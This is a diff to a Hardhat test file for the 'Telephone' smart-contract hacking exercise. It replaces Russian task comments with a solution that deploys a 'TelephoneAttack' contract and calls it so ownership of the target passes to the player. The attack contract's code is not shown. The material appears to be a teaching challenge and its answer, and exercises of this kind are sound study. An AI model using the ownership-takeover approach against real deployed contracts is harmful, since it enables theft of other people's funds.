@@ -17,11 +17,15 @@ describe("Telephone", function () {
   }
 
   it("hack", async function () {
-    const { Telephone, player } = await loadFixture(deployFixture);
+    const { Telephone, deployer } = await loadFixture(deployFixture);
 
-    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
+    const Attacker = await ethers.getContractFactory("TelephoneAttack");
+    const attacker = await Attacker.deploy(Telephone.address);
+    await attacker.deployed();
 
-    // теперь владелец контракта player, а не owner
+    const [_, player] = await ethers.getSigners();
+    await attacker.connect(player).attack(player.address);
+
     expect(await Telephone.owner()).to.equal(player);
   });
 });
